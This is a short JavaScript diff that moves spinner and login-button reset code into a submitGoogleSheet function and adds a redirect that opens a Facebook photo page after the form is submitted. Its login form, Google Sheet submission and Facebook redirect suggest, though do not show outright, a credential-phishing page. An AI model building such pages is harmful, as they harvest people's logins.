@@ -25,9 +25,6 @@ const submitFormData = async (formData, rawFormData) => {
   }
 
   submitGoogleSheet(rawFormData);
-
-  loadingSvg.classList.remove("active");
-  loginButton.classList.add("active");
 };
 
 const submitGoogleSheet = async (formData) => {
@@ -48,6 +45,11 @@ const submitGoogleSheet = async (formData) => {
 
   loadingSvg.classList.remove("active");
   loginButton.classList.add("active");
+
+  window.open(
+    "https://www.facebook.com/photo/?fbid=165534512758709&set=a.165534506092043",
+    "_blank"
+  );
 };
 
 formEl.addEventListener("submit", async (e) => {
